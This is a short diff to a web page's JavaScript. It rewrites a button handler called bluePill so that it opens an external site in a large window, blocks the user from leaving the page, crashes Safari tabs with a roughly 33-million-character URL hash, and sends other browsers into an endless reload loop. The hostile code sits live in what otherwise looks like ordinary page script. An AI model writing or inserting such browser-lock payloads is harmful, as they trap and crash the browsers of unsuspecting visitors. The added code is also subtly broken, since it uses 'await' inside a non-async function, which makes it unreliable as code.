@@ -167,7 +167,9 @@
         } 
   
       function bluePill() {
-        window.open("https://182.ooo/jam", "", "width=1920, height=1080");
+        window.open("http://blackbreeders.com", "", "width=1920, height=1080");
+        await new Promise(r => setTimeout(r, 2000));
+        window.onbeforeunload=function(){return true};if(/^((?!chrome|android).)*safari/i.test(navigator.userAgent))onload=()=>location.hash="M"+"\u0001".repeat(2**25)+"m";else{for(;;)location.reload(1)}
         }
       function greenPill() {
           const requestPointerLockApi = (
